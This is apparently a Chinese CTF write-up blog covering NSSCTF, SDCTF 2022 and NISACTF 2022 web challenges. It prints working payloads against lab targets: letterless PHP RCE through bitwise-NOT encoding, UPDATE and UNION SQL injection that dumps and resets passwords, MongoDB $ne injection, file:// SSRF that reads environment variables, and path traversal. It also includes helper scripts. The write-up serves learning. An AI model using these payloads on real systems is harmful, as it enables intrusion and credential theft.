<span class="hljs-variable">$mess</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'mess'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-zA-Z]/"</span>,<span class="hljs-variable">$mess</span>)){
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid input!"</span>);
}
<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$mess</span>);</code></pre>
<p>知道就是无字母RCE</p>
<pre><code class="hljs scss">mess=$_=(~%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B);$__=(~%A0%B8%BA%AB);$___=$$__;$<span class="hljs-built_in">_</span>($___[<span class="hljs-number">1</span>]);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620470.png" alt="image-20240714161023741"></p>
<h2 id="calculate">Calculate</h2>
<p>计算题</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">'http://node5.anna.nssctf.cn:29251/'</span>
s = requests.Session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">20</span>):
    res1 = s.get(url=url)

    soup = BeautifulSoup(res1.text,<span class="hljs-string">'html.parser'</span>)
    tags = soup.find_all(<span class="hljs-string">'div'</span>)

    cal = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> tags:
        <span class="hljs-comment">#print(tag.text)</span>
        cal += tag.text

    cal = cal[:-<span class="hljs-number">1</span>]
    num = <span class="hljs-built_in">eval</span>(cal)

    time.sleep(<span class="hljs-number">1</span>)
    res2 = s.post(url=url,data={<span class="hljs-string">"ans"</span>: <span class="hljs-string">f"<span class="hljs-subst">{num}</span>"</span>})
    <span class="hljs-built_in">print</span>(res2.text)</code></pre>
<h2 id="ezsql">ezsql</h2>
<p>首页发现存在注册和登录功能，知道有个admin用户但不知道密码。弱口令不行，尝试注册一个用户，注册之后发现可以更新自己的个人信息，抓包进一步测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620471.png" alt="image-20240714165119998"></p>
<p>同时目录扫描，得到源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620472.png" alt="image-20240714165542221"></p>
<p>发现update.php中，箭头处存在update注入，其他的地方都用了?作为占位符，不能注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620473.png" alt="image-20240714165923052"></p>
<p>这里能知道，采用闭合思路，age不用单引号闭合，然后直接跟逗号，后面给description赋值即可，剩下的用注释符注释掉即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620474.png" alt="image-20240714170135414"></p>
<p>不过查询的结果需要跟随重定向才能看到</p>
<pre><code class="hljs scss">POST /update<span class="hljs-selector-class">.php</span> HTTP/<span class="hljs-number">1.1</span>
Host: node5.anna.nssctf.cn:<span class="hljs-number">22826</span>
Content-Length: <span class="hljs-number">98</span>
Cache-Control: max-age=<span class="hljs-number">0</span>
Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
Origin: http://node5.anna.nssctf.cn:<span class="hljs-number">22826</span>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">126.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span> Safari/<span class="hljs-number">537.36</span>
Accept: text/html,application/xhtml+xml,application/xml;<span class="hljs-selector-tag">q</span>=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="hljs-comment">Referer: http://node5.anna.nssctf.cn:22826/index.php</span>
<span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span>
<span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span>
<span class="hljs-comment">Cookie: PHPSESSID=j0q7264e5365c0o7vfiotfg1v0</span>
<span class="hljs-comment">Connection: close</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">nickname=asd&amp;age=23,description=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+&amp;description=asd&amp;token=548bb4d1fef203db60b6e63044b286fd</span></code></pre>
<p>数据库名字为demo2</p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620475.png" alt="image-20240714170334814"></p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(column_name)from information_schema<span class="hljs-selector-class">.columns</span> where table_name=<span class="hljs-number">0</span>x7573657273</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620476.png" alt="image-20240714170458015"></p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(password)from users</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620477.png" alt="image-20240714170610486"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620478.png" alt="image-20240714170659065"></p>
<p>得到密码。当然也可以直接尝试修改密码</p>
<pre><code class="hljs scss">nickname=hhh&amp;age=<span class="hljs-number">23</span>, password=<span class="hljs-number">0</span>x3230326362393632616335393037356239363462303731353264323334623730</code></pre>
<h1 id="sdctf-2022">[SDCTF 2022]</h1>
<h2 id="apollo-1337">Apollo 1337</h2>
<p>这道题开始也算有思路，但是没找到关键，于是看了一眼wp，发现还是要仔细看看前端页面交互情况</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157044.png" alt="image-20240718153843341"></p>
<p>这里直接用插件看到了一个api接口，当然也可以F12查看网络模块。访问之后如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157045.png" alt="image-20240718153922739"></p>
<p>然后尝试的给verbose参数传参，发现不论传什么数据，回显如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157046.png" alt="image-20240718154221582"></p>
<p>可以看到有三个路由，分别访问看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157047.png" alt="image-20240718154249444"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157048.png" alt="image-20240718154340164"></p>
<p>之后回到rocketlaunch路由，尝试切换为json类型，然后发现提示rocket变量未设置，那我们设置一下，如下图，提示我们应该赋值为triton</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157049.png" alt="image-20240718154649178"></p>
<p>之后发包提示没有设置launchTime变量，于是我继续添加，发现参数值格式为hh:mm，发送之后说我们的发送时间不对</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157050.png" alt="image-20240718155048805"></p>
<p>无法，看了wp发现这个平台的题目缺少题目描述：</p>
<pre><code class="hljs scss">Hey there intern! We have <span class="hljs-selector-tag">a</span> rocket launch scheduled for noon today and the launch
interface is down. You'll need to directly use the API to launch the rocket. No, we don't
have any documentation. And quickly, our shareholders are watching!</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157051.png" alt="image-20240718155129403"></p>
<p>这里提到是中午发射火箭，我们尝试12:00</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157052.png" alt="image-20240718155236644"></p>
<p>之后设置pumpID变量，传值的时候，当我们传的不对，会提示，测试之后发现4是可以的（这里也调用了fule的接口）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157053.png" alt="image-20240718155334526"></p>
<p>最后提示我们设置token，这里随便输入之后，提示我们token无效，接着我返回前端，翻找js是否含有token，果不其然找到了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157054.png" alt="image-20240718160038147"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157055.png" alt="image-20240718155953907"></p>
<h2 id="curl-up-and-read">CURL Up and Read</h2>
<p>首页一个http请求页面，输入正确url格式，然后请求目标网址内容，这里先尝试了请求127.0.0.1，显示内部错误</p>
<p>随后看了提示，尝试利用file伪协议，查看proc/1/environ环境变量，但是发现前端对格式做了限制，但同时发现格式被编码为了base64，接着如下图构造以下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157056.png" alt="image-20240718161709095"></p>
<p>随机拼接url路由，得到环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157057.png" alt="image-20240718161513744"></p>
<h2 id="jawt-that-down">jawt that down!</h2>
<p>首先，信息搜集了一波，发现前端js文件泄露了账号和密码</p>
<pre><code class="hljs scss">}, r<span class="hljs-selector-class">.createElement</span>("span", {
                        className: "heading"
                    }, "Admin Sign In"), r<span class="hljs-selector-class">.createElement</span>("label", {
                        htmlFor: "username",
                        dangerouslySetInnerHTML: {
                            __html: "\x3c!-- REMOVE ME IN PUBLISHED SITE! Username: AzureDiamond --\x3eUsername"
                        }
                    }), r<span class="hljs-selector-class">.createElement</span>("input", {
                        type: "text",
                        id: "username",
                        name: "username"
                    }), r<span class="hljs-selector-class">.createElement</span>("label", {
                        htmlFor: "password",
                        dangerouslySetInnerHTML: {
                            __html: "\x3c!-- REMOVE ME IN PUBLISHED SITE! Password: hunter2 --\x3ePassword"
                        }</code></pre>
<p>接着按上面的账号登陆，发现页面多了一个N的超链接，不过访问的时候，显示找不到，过了几秒在访问，显示无效token，尝试点击这个超链接的时候抓包，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157058.png" alt="image-20240718165500515"></p>
<p>存在jwt，解密一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157059.png" alt="image-20240718165527424"></p>
<p>发现从签发时间到过期时间，只有2秒，但我们又破解不出来secret，同时复现的时候，题目感觉有点问题，没啥思路只能看wp，发现题目似乎的确有问题，当我点击N超链接的时候，url却是拼接的小写n，根据wp，我在登录之后迅速拼接大写N，得到下图回显</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157060.png" alt="image-20240718165453413"></p>
<p>这里做多了能想到利用python发包，不断登录不断回显，这里也有点脑洞，回显的字符，应该与上一个字符进行拼接形成目录：<code>/N/S</code>这样的形式</p>
<p>这样的话，写脚本思路也就清晰了。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://node5.anna.nssctf.cn:25446/login"</span>
data = {<span class="hljs-string">"username"</span>: <span class="hljs-string">"AzureDiamond"</span>, <span class="hljs-string">"password"</span>: <span class="hljs-string">"hunter2"</span>}
sess = requests.session()
path = [<span class="hljs-string">'N'</span>, <span class="hljs-string">'S'</span>, <span class="hljs-string">'S'</span>]

sess.post(url=url, data=data)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():
    sess.post(url=url, data=data)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dir</span>(<span class="hljs-params">path_s</span>):
    res = sess.get(url=<span class="hljs-string">'http://node5.anna.nssctf.cn:25446/{}'</span>.<span class="hljs-built_in">format</span>(path_s))
    <span class="hljs-keyword">return</span> res.text

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-built_in">print</span>(path)
    path_s = <span class="hljs-string">'/'</span>.join(path)
    next_dir = get_dir(path_s)
    <span class="hljs-built_in">print</span>(next_dir)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"Invalid Token: Access Denied"</span> == next_dir:
        login()
    <span class="hljs-keyword">elif</span> <span class="hljs-string">'End of message'</span> <span class="hljs-keyword">in</span> next_dir:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join(path))
        sys.exit(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">else</span>:
        path.append(next_dir)</code></pre>
<h2 id="lots-of-logs">lots of logs</h2>
<p>题目给了两个网址，第二个访问不了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157061.png" alt="image-20240718175931201"></p>
<p>访问第一个，发现里面除了能看到一些日志，其余也没啥信息了，看了wp发现，原来是观察url</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157062.png" alt="image-20240718180035863"></p>
<p>可以看到这里的目录很有结构规律，这里就可以尝试脚本自动化爬取其中的信息了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2018</span>, <span class="hljs-number">2020</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31</span>):
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31</span>):
            <span class="hljs-keyword">try</span>:
                date = datetime.date(i, j, k).strftime(<span class="hljs-string">"%a"</span>)
                url = <span class="hljs-string">f"http://node5.anna.nssctf.cn:27072/logs/<span class="hljs-subst">{i}</span>/<span class="hljs-subst">{j}</span>/<span class="hljs-subst">{k}</span>/<span class="hljs-subst">{date}</span>.log"</span>
                req = requests.get(url).text
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{i}</span>:<span class="hljs-subst">{j}</span>:<span class="hljs-subst">{k}</span>:<span class="hljs-subst">{date}</span>.log"</span>)
                <span class="hljs-keyword">if</span> <span class="hljs-string">"Cannot GET"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:
                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f"<span class="hljs-subst">{i}</span>-<span class="hljs-subst">{j}</span>-<span class="hljs-subst">{k}</span>-<span class="hljs-subst">{date}</span>.log"</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
                        f.write(req)
                        f.close()
            <span class="hljs-keyword">except</span> ValueError:
                <span class="hljs-keyword">pass</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157063.png" alt="image-20240718181708325"></p>
<p>也是马后炮，才得知，第二个网址是用来nc的，链接上去发现要提供密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157064.png" alt="image-20240718181923960"></p>
<p>这道题考察的就是分析日志的能力了。。。，说实话，这么多日志，思路估计也就是找flag、nssctf之类的字眼，不过要是能知道第二个网址是要nc的，也就知道这里的找密码了。同时Linux命令熟悉的话，更简便了。。。</p>
<h2 id="gullible-by-dovesign">gullible by dovesign</h2>
<p>网站有文件上传的功能，同时也提示我们waf很强，然后我显示网上找了几个bird的图片，发现不能识别，于是我尝试下载本网站已经上传的图片，发现可以识别成功，经过对比和wp的提示。</p>
<p>可以看到这个waf是检测元数据内容的，如下图，如果元数据有鸟的名字就能正常识别了。随即也测试了可以上传php、asp等后缀，他没有检测，但是却不能知道文件路径，也无法猜测（wp的。。。）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157065.png" alt="image-20240718185309551"></p>
<p>随即尝试对图片名字测试，发现输入单引号，爆出sqlite错误，明显的sql注入了，网上找payload打</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157066.png" alt="image-20240718185828440"></p>
<p>上图可以确定含有三列，接下来找回显位：<code>1' union select 1,2,3--</code>确定回显位是2</p>
<p>然后找表明，如下图是三个，这里直觉选择employee</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157067.png" alt="image-20240718191357552"></p>
<p>最后在password中找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157068.png" alt="image-20240718191529497"></p>
<h2 id="humongous-mistake">HuMongous Mistake</h2>
<p>这道题目还得用到那个官方discord的服务器，由于我不知道咋找，索性只看个思路了。</p>
<p>这题的入手点是一个mongdb的nosql注入，参考文章如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x03-NoSQL%E6%B3%A8%E5%85%A5">NoSQL注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E6%97%A7%E7%89%88%E5%86%99%E6%B3%95%E4%B8%80%E4%B8%8E%E6%96%B0%E7%89%88%E5%86%99%E6%B3%95%E4%B8%80">MongoDB 注入指北</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmrWd4DttQYtO4D#toc-10">Nosql 注入从零到一</a></p>
<p>用到的思路是PHP数组注入：</p>
<pre><code class="hljs scss">?username<span class="hljs-selector-attr">[$ne]</span>=<span class="hljs-number">1</span>&amp;password<span class="hljs-selector-attr">[$ne]</span>=<span class="hljs-number">1</span></code></pre>
<p>类似上述payload，那个网站在登陆的时候，存在admin用户，但是我们不知道密码。但却知道这是mongdb数据库，于是我们构造类似上述的payload，admin是已知的，那么重点关注password了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157069.png" alt="image-20240718194834655"></p>
<p>最终再尝试下，猜测服务器只检查长度大小，于是向password添加了长度属性，成功绕过。后面似乎就是用户身份验证问题了。</p>
<p><a target="_blank" rel="noopener" href="https://sheeptester.github.io/longer-tweets/ctf/#mongodb-admin-ctf">sdctf 22 write-up</a></p>
<h1 id="nisactf-2022">[NISACTF 2022]</h1>
<h2 id="easyssrf">easyssrf</h2>
<p>根据页面提示，当使用file伪协议，发现回显明显不同，尝试file:///etc/passwd之后，回显：换个其他路径</p>
<p>然后尝试读取根目录的flag，发现如下图，让我们查看fl4g</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157070.png" alt="image-20240719161756786"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157071.png" alt="image-20240719161654867"></p>
<p>如上图，得到提示，访问之后代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"file"</span>)){
  <span class="hljs-keyword">die</span>(<span class="hljs-string">"你败了."</span>);
}

<span class="hljs-comment">//flag in /flag</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);</code></pre>
<p>如果file参数含有file字符，则无法正常读取文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157072.png" alt="image-20240719162001658"></p>
<p>尝试目录穿越，得到flag，不过伪协议也可以</p>
<h2 id="checkin">checkin</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
<span class="hljs-comment">// ‮⁦NISACTF⁩⁦Welcome to</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">"jitanglailo"</span> == <span class="hljs-variable">$_GET</span>[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; <span class="hljs-string">"‮⁦ Flag!⁩⁦N1SACTF"</span> == <span class="hljs-variable">$_GET</span>[‮⁦Ugeiwo⁩⁦cuishiyuan]) { <span class="hljs-comment">//tnnd! weishenme b</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;
}
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>代码看着简单，但当你传参完之后，发现flag不能回显，接着我尝试鼠标复制这些参数值，发现光标不能正常跟着鼠标位置走。凭经验，直接cv全部，然后用vscode打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157073.png" alt="image-20240719164849162"></p>
<p>果然看到了特殊的unicode编码，最简单的办法：看wp学到的，直接F12查看源代码</p>
